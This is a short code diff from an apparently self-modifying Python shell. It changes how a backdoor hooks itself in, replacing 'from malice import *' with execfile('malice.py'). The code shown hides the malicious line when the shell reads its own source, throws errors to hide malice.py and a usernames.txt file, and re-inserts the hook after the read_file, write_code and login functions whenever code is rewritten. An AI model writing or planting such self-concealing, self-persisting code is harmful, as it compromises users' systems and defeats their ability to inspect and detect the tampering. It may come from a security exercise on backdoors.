@@ -10,7 +10,7 @@ def read_file(filename):
         # if it's the shell code file itself, return the shell code minus the
         # malicious line (the import)
         if filename == "shell.py":
-            return fd.read().replace("from malice import *\n", "")
+            return fd.read().replace("execfile('malice.py')\n", "")
         # throw an error if it's one of the malicious files (username.txt or this file)
         elif filename in ["malice.py", "usernames.txt"]:
             raise IOError
@@ -20,7 +20,7 @@ def read_file(filename):
 def write_code(new_code):
     code_file = __file__
     new_new_code = new_code
-    insertion = "from malice import *\n"
+    insertion = "execfile('malice.py')\n"
     new_new_code = insert_after_function(new_new_code, "read_file", insertion)
     new_new_code = insert_after_function(new_new_code, "write_code", insertion)
     new_new_code = insert_after_function(new_new_code, "login", insertion)
